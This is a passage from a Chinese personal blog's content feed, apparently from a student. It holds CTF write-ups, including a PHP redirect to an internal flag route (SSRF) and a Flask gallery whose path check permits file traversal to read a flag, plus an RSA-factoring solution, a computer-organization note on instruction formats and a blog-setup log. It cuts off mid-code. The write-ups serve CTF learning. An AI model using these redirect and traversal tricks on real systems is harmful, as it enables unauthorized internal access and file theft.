自己的服务器 =&gt; 重定向访问到内网的flag路由</p><p>写在服务器的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:1337/flag&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web-galleria">web/Galleria</h2><h3 id="题面：">题面：</h3><p>Put up some fun images for everyone in this amazing image gallery!</p><h3 id="题目：">题目：</h3><p><a href="http://app.py">app.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    allowed_extensions = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> allowed_extensions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = request.files[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">        <span class="keyword">if</span> file.tell() &gt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File is too large&quot;</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line">        file.seek(<span class="number">0</span>)</span><br><span class="line">        filename = secure_filename(os.path.basename(file.filename))</span><br><span class="line">        file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;gallery&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_file_path</span>(<span class="params">path</span>):</span><br><span class="line">    _path = Path(path)</span><br><span class="line"></span><br><span class="line">    parts = [*Path.cwd().parts][<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> _path.parts:</span><br><span class="line">        <span class="keyword">if</span> part == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> part == <span class="string">&#x27;..&#x27;</span>:</span><br><span class="line">            parts.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parts.append(part)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    _path = os.path.join(os.getcwd(), path)</span><br><span class="line">    _path = Path(_path)</span><br><span class="line">    <span class="keyword">return</span> _path.exists() <span class="keyword">and</span> _path.is_file()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gallery&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gallery</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;uploads&#x27;</span>, request.args.get(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_file_path(filename):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;gallery&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> send_file(filename)</span><br><span class="line"></span><br><span class="line">    image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(</span><br><span class="line">        app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;gallery.html&#x27;</span>, images=image_files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.11</span>-slim AS app</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 install --no-cache-dir flask</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> uploads</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> templates ./templates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /tmp/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><h3 id="考点：代码审查">考点：代码审查</h3><h3 id="解题：">解题：</h3><p>我们先没有看源码的情况下 上传一张图片 然后发现看到其他人上传的照片全部显示出来了</p><p>这引起一丝警觉</p><p>然后对代码进行审查</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221703254.png" alt="image-20231206221703254"></p><p>找到这个路由</p><p>参数是<code>file</code></p><p>对file指定的文件进行读取</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221803040.png" alt="image-20231206221803040"></p><p>然后我们又在dockerfile中看到flag文件的位置</p><p>读！</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221906877.png" alt="image-20231206221906877"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计组学习笔记】第四章——指令系统</title>
      <link href="/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="4-1-指令系统：">4.1 指令系统：</h1><p>​       指令：又称<strong>机器指令</strong>，是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。</p><p>指令集：一台计算机的所有指令的集合构成该机的<strong>指令系统</strong></p><p>指令系统（指令集）是指令集体系结构（ISA）中最核心的部分</p><h2 id="4-1-1-指令的基本格式">4.1.1 指令的基本格式</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700735562097-07f8460f-776a-48bc-8ce5-f9c50a5d51c0.png" alt="img"></p><ul><li><p>操作码：指明做了什么动作</p></li><li><ul><li>作用1：执行什么性质的操作，具有何种功能</li><li>作用2：识别指令、了解指令功能、区分操作数地址内容的组成和使用方法</li><li>举例：停机中断、求反求补、加减乘除</li></ul></li><li><p>地址码：指明对谁动手脚</p></li><li><ul><li>不需要操作对象</li><li>需要一个操作对象</li><li>需要两个操作对象</li><li>特性：</li></ul></li><li><ul><li><ul><li>n位地址码的直接寻址范围=<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img"></li><li>若指令总长度固定不变，则地址码数量越多，寻址能力越差</li></ul></li></ul></li><li><p>指令的长度：一条指令中所包含的二进制代码的位数</p></li><li><ul><li>指令字长取决于：</li></ul></li><li><ul><li><ul><li>操作码的长度</li><li>操作数<strong>地址码</strong>的长度</li><li>操作数<strong>地址</strong>的个数</li></ul></li></ul></li><li><ul><li>指令长度和机器字长无固定关系，但是可以进行分类：</li></ul></li><li><ul><li><ul><li>单字长指令：指令长度等于机器字长的指令</li><li>半字长指令：指令长度等于半个机器字长的指令</li><li>双字长指令：指令长度等于两个机器字长的指令</li></ul></li></ul></li><li><p>指令字长</p></li></ul><p>一条指令的总长度（可能会变）</p><ul><li>机器字长</li></ul><p>CPU进行一次整数运算所能处理的二进制数据的位数（通常和ALU相关）</p><ul><li>存储字长</li></ul><p>一个存储单元中的二进制代码位数（通常和MDR位数相同）</p><h3 id="整体框架">整体框架</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529939609-9f254304-23dc-4a9a-9d61-80949cf2c2cf.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700530803938-6d4044e8-5482-4e7e-b826-8bb40a6b0cf7.png" alt="img"></p><p><strong>解释一下：</strong></p><p><strong>MAR</strong>：地址寄存器 存放预访问的存储单元的地址，其位数对应存储单元的个数</p><p><strong>MDR</strong>：数据寄存器 存放从存储体某单元取出的代码</p><h3 id="1-零地址指令">1. 零地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700737333811-b69655d1-5b3c-492d-9f21-8f7924ec2c13.png" alt="img"></p><p>只给出操作码OP，没有显式地址。有两种可能：</p><p>(1) 不需要操作数的指令，如空操作，停机，关中断等指令</p><p>(2) 零地址的运算类指令仅用在堆栈计算机中，两个操作数隐含存放在栈顶和次栈顶弹出，送到运算器进行运算，计算结果隐含的压回栈顶 类似“后缀表达式”</p><h3 id="2-一地址指令">2. 一地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700528843600-4834a977-6e70-4c86-93b5-cec8be702aaa.png" alt="img"></p><p>其中</p><p><strong>ACC</strong>：Accumulator累加器，是运算器中既能存放运算前的操作数，又能存放运算结果的寄存器</p><p><strong>ALU</strong>：算数逻辑单元，可以进行算术运算（加减乘除）逻辑运算（与或非异或）辅助功能（移位求补）</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，1个地址码字段占24位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15d04819c5dddc99711267e7e27f0f98.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/872f8e29a949503f528e4a65325b996e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/64636e8771ef215128139253c19e840a.svg" alt="img">位 = 16 M</p><h3 id="3-二地址指令">3. 二地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700527387652-2cf386f0-ff1e-4f7f-ac75-92bf857bee0f.png" alt="img"></p><p>其中目的操作数保存本次的运算结果</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，两个地址码字段各占12位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15cd115f2a18cc8842ed3d8dc9d5372e.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/47a0f3528006ad0757aa3a00b3fd6f5e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/f21b0a508bad7e226d4eebcb732edd1a.svg" alt="img">位 = 4 K</p><h3 id="4-三地址指令">4. 三地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529808503-fc9a6875-4ce1-427e-97cd-0ca5f0c1b972.png" alt="img"></p><h3 id="5-四地址指令">5. 四地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529860336-14105e7b-4bb1-4e34-92b0-0551537b255b.png" alt="img"></p><p>特殊点：</p><p>正常情况下取指令之后PC+1，指向下一条指令</p><p>四指令地址：取执行指令后，将PC的值修改为<img src="https://cdn.nlark.com/yuque/__latex/e639cfa67e1a86f2b6223153524439bc.svg" alt="img">（下址）所指地址</p><h2 id="4-1-2-定长操作码指令格式">4.1.2 定长操作码指令格式</h2><p><strong>定长操作码</strong>指令在指令的最高部分分配若干位（定长）表示操作码。</p><p>一般n位操作码字段的指令系统最大能表示<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img">条指令</p><h2 id="4-1-3-扩展操作码指令格式">4.1.3 扩展操作码指令格式</h2><h3 id="目的：">目的：</h3><p>在指令字长有限的前提下保持比较丰富的指令种类，可采用<strong>可变长度操作码</strong>，即全部指令的操作码字段的位数不固定，且分散地放在指令字的不同位置上。</p><h3 id="实现方式：">实现方式：</h3><p>定长指令字结构+可变长操作码 -&gt; 扩展操作码指令格式</p><p><strong>扩展操作码</strong> 使操作码的长度随地址码的减少而增加，不同地址数的指令可具有不同长度的操作码，从而在满足需要的前提下有效缩短指令字长</p><h2 id="4-1-4-指令分类-按操作类型分类">4.1.4 指令分类（按操作类型分类）</h2><h3 id="1-数据传送-数据传送类：进行主存和cpu之间的数据传送">1. 数据传送（数据传送类：进行主存和CPU之间的数据传送）</h3><ol><li><ol><li>LOAD：从内存单元读取数据到CPU寄存器（LOAD）</li><li>STORE：把CPU寄存器写数据到内存单元（STORE）</li><li>MOV：传输指令通常由寄存器之间的传送（MOV）</li></ol></li></ol><h3 id="2-运算类">2. 运算类</h3><p>算数与逻辑运算：</p><blockquote><p>ADD：加</p><p>SUB：减</p><p>CMP：比较</p><p>MUL：乘</p><p>DIV：除</p><p>INC：加1</p><p>DEC：减1</p><p>AND：与</p><p>OR：或</p><p>NOT：取反</p><p>XOR：异或</p></blockquote><h3 id="3-移位操作">3. 移位操作</h3><ol><li>算数移位</li><li>逻辑移位</li><li>循环移位</li></ol><h3 id="4-转移操作">4. 转移操作</h3><blockquote><p>JMP：无条件转移</p><p>BRANCH：条件转移</p><p>CALL：调用</p><p>RET：返回</p><p>TRAP：陷阱</p></blockquote><p>区分：</p><ul><li><p><strong>无条件转移指令</strong>在任何情况下都执行转移操作</p></li><li><p><strong>条件转移指令</strong>仅在特定条件满足时才执行转移操作，其中转移条件一般是某个标志位的值，或几个标志位的组合</p></li><li><p>执行<strong>调用指令</strong>是必须保存下一条指令的地址（返回地址），当子程序执行结束时，根据返回地址返回到主程序继续执行</p></li><li><p><strong>转移指令</strong>则不返回执行</p></li></ul><h3 id="5-输入输出类">5. 输入输出类</h3><p>CPU与外部设备</p>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建记录</title>
      <link href="/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建记录">博客搭建记录</h1><p>今天终于也算是完成了基于hexo框架 butterfly主题的博客搭建<br>在这过程中收获很多<br>对于git、npm的使用和理解也更多了</p><hr><p>目前整体的使用流程就是在本地写好md文件放到post中<br>然后在本地blog文件夹中打开<code>git bash</code><br>常用的只有三种命令</p><ul><li><code>hexo g</code></li><li><code>hexo d</code> 远程推送</li><li><code>hexo s</code> 本地查看</li></ul><hr><p>在搭建过程中也遇到很多问题，将看到的博客记录下：</p><ul><li><a href="https://www.wzhecnu.cn/2021/07/22/blog/hexo-02-zhu-ti-mei-hua/">设置分类和标签</a></li><li><a href="https://hj24.life/posts/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E4%B8%8D%E8%83%BD%E6%98%BE%E7%A4%BA%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/">外部图床无法引用问题</a></li><li><a href="https://blog.csdn.net/cj461733387/article/details/124548828">法二</a></li></ul><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231122015855865.png" alt="image-20231122015855865"></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/655349835">上传过慢，配置ssh</a></p></li><li><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">效果美化</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023HECTF</title>
      <link href="/2023/11/21/2023-11-18-HECTF/"/>
      <url>/2023/11/21/2023-11-18-HECTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023hectf">2023HECTF</h1><h2 id="crypto">Crypto</h2><h3 id="rsarsa-solved">rsarsa|(solved）</h3><h4 id="考点：rsa-公式分解">考点：rsa 公式分解</h4><h4 id="解题：">解题：</h4><p>原题:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from functools import reduce</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># from secret import flag,hint</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generate_PQ(bits):</span></span><br><span class="line"><span class="comment">#     x = getPrime(bits) &gt;&gt; bits//2 &lt;&lt; bits//2</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         p = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(p):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         q = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(q):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     return p,q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># hint = bytes_to_long(hint)</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># p,q = generate_PQ(1024)</span></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line">seed = <span class="number">256087</span>+<span class="number">396445</span>-<span class="number">538018</span></span><br><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment"># print(&quot;c =&quot;,pow(hint,e,n))</span></span><br><span class="line"><span class="comment"># print(&quot;n =&quot;,n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;c1 =&quot;,pow(reduce(lambda x, y: x * m + y, x), 17, n))</span></span><br><span class="line"><span class="comment"># #解释一下这段公式</span></span><br><span class="line"><span class="comment"># #reduce函数存在两个参数 第一个是式子 第二个是对应的操作值</span></span><br><span class="line"><span class="comment"># #比如一个x=[2,3,4] 那么lambda表达式会每次在x中取两个值 并且将运算的结果累计到下一个x 然后y向后取一个数                                      </span></span><br><span class="line"><span class="comment"># print(&quot;c2 =&quot;,pow(reduce(lambda x, y: x * m + y, y), 17, n))</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259</span></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(c1,c2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = pow(x,17,n)</span></span><br><span class="line">p = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792076628602313168161987456794466948371108388445589568660803435612911564349113520700334500717237521981464112146232603304167030094761289132103178741978484324163</span></span><br><span class="line">q = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792069345408116962980054711105579607903079344180647686753187313507576711078157922258567830351506693970326314484271008164343339287427523462030830749467794546707</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment">#b&#x27;Hint&#123;Seed_is_256087_+_396445_-_538018&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中一些解题的经过也放在里面了</p><p>该题主要是两部分组成</p><p>首先是根据p和q的生成方式 两数非常接近</p><p>所以通过yafu本地即可以分解n</p><p>然后利用n分解的p和q 成功获得hint提示</p><p>提示告诉了我们种子是什么</p><p>在生成随机数的时候：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br></pre></td></tr></table></figure><p>随机数生成器由种子决定 所以是伪随机</p><p>当种子seed确定之后 后面两个值的生成是完全固定的</p><p>所以算出种子 本地跑一下就可以获得x和y的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span 